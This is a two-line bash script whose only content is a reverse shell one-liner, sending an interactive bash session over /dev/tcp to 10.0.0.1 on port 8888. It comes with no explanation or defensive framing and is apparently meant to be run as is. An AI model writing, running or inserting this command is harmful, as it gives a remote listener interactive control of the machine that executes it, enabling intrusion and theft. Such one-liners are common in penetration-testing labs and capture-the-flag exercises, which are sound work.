#!/bin/bash

bash -i >& /dev/tcp/10.0.0.1/8888 0>&1
